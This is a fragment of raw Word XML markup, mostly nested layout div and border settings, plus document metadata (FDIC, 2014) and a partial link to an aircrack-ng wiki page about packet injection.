                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="1642228945">
                                                      <w:marLeft w:val="0"/>
                                                      <w:marRight w:val="0"/>
                                                      <w:marTop w:val="0"/>
                                                      <w:marBottom w:val="0"/>
                                                      <w:divBdr>
                                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                      </w:divBdr>
                                                    </w:div>
                                                  </w:divsChild>
                                                </w:div>
                                                <w:div w:id="1844124352">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="13206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437430">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="980311461">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="154884724">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="677274688">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="288628074">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="621882411">
                                                      <w:marLeft w:val="0"/>
                                                      <w:marRight w:val="0"/>
                                                      <w:marTop w:val="0"/>
                                                      <w:marBottom w:val="0"/>
                                                      <w:divBdr>
                                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                      </w:divBdr>
                                                    </w:div>
                                                  </w:divsChild>
                                                </w:div>
                                                <w:div w:id="1898972874">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="18233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593729">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="23679081">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="997221566">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="59792148">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="1569337309">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="392508595">
                                                      <w:marLeft w:val="0"/>
                                                      <w:marRight w:val="0"/>
                                                      <w:marTop w:val="0"/>
                                                      <w:marBottom w:val="0"/>
                                                      <w:divBdr>
                                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                      </w:divBdr>
                                                    </w:div>
                                                  </w:divsChild>
                                                </w:div>
                                                <w:div w:id="1253199392">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="12706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04802">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="1870026112">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="1005287402">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="829444727">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="917638011">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="333262726">
                                                      <w:marLeft w:val="0"/>
                                                      <w:marRight w:val="0"/>
                                                      <w:marTop w:val="0"/>
                                                      <w:marBottom w:val="0"/>
                                                      <w:divBdr>
                                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                      </w:divBdr>
                                                    </w:div>
                                                  </w:divsChild>
                                                </w:div>
                                                <w:div w:id="37359375">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="10388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707455">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="296420887">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="855004113">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="239676667">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="799803998">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="1517188696">
                                                      <w:marLeft w:val="0"/>
                                                      <w:marRight w:val="0"/>
                                                      <w:marTop w:val="0"/>
                                                      <w:marBottom w:val="0"/>
                                                      <w:divBdr>
                                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                      </w:divBdr>
                                                    </w:div>
                                                  </w:divsChild>
                                                </w:div>
                                                <w:div w:id="1241913954">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="10944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ircrack-ng.org/doku.php?id=i_am_injecting_but_the_ivs_don_t_increase&amp;DokuWiki=6a98f589ec171d976ab1600c6641c9a4"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17</Pages>
  <Words>3965</Words>
  <Characters>22605</Characters>
  <Application>Microsoft Macintosh Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>188</Lines>
  <Paragraphs>53</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company>FDIC</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>26517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James M.</dc:creator>
  <cp:lastModifiedBy>Office 2004 Test Drive User</cp:lastModifiedBy>
  <cp:revision>46</cp:revision>
  <cp:lastPrinted>2014-11-13T01:13:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2014-10-19T20:48:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2014-11-17T17:41:00Z</dcterms:modified>
</cp:coreProperties>
</file>